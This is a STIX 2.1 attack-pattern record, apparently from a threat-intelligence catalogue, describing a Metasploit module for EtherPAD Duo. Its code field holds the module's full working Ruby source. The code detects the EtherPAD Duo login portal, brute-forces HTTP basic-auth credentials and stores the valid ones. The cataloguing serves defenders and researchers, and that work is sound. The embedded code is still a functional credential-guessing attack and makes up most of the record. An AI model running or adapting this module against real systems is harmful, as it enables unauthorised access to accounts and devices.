{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--18be8593-c54e-480c-b222-fa42a9921810",
    "created": "2024-08-14T16:28:42.093485Z",
    "modified": "2024-08-14T16:28:42.093488Z",
    "name": "EtherPAD Duo Login Bruteforce Utility",
    "description": " This module scans for EtherPAD Duo login portal, and performs a login bruteforce attack to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/etherpad_duo_login.rb",
            "external_id": "etherpad_duo_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n    'Name'           => 'EtherPAD Duo Login Bruteforce Utility',\n    'Description'    => %{\n      This module scans for EtherPAD Duo login portal, and\n      performs a login bruteforce attack to identify valid credentials.\n    },\n    'Author'         =>\n      [\n        'Karn Ganeshen <KarnGaneshen[at]gmail.com>',\n      ],\n    'License'        => MSF_LICENSE\n    ))\n\n    deregister_options('HttpUsername', 'HttpPassword')\n  end\n\n  def run_host(ip)\n    unless is_app_epaduo?\n      return\n    end\n\n    print_status(\"Starting login bruteforce...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  #\n  # What's the point of running this module if the target actually isn't EtherPAD Duo\n  #\n\n  def is_app_epaduo?\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => normalize_uri('/', 'CGI', 'mParseCGI'),\n        'method'    => 'GET',\n        'vars_get'  => {\n          'file' => 'mainpage.html'\n        }\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      vprint_error(\"HTTP Connection Failed...\")\n      return false\n    end\n\n    if (res and res.code == 200 and res.headers['Server'] =~ /EtherPAD/ and res.body.include?(\"EtherPAD Duo\"))\n      vprint_good(\"Running EtherPAD Duo application ...\")\n      return true\n    else\n      vprint_error(\"Application is not EtherPAD Duo. Module will not continue.\")\n      return false\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Brute-force the login page\n  #\n\n  def do_login(user, pass)\n    vprint_status(\"Trying username:#{user.inspect} with password:#{pass.inspect}\")\n\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => normalize_uri('/', 'config', 'configindex.ehtml'),\n        'method'    => 'GET',\n        'authorization' => basic_auth(user, pass)\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      vprint_error(\"HTTP Connection Failed...\")\n      return :abort\n    end\n\n    if res && res.code == 200 && res.body.include?(\"Home Page\") && res.headers['Server'] && res.headers['Server'].include?(\"EtherPAD\")\n      print_good(\"SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)\n      return :next_user\n    else\n      vprint_error(\"FAILED LOGIN - #{user.inspect}:#{pass.inspect}\")\n    end\n  end\nend\n"
}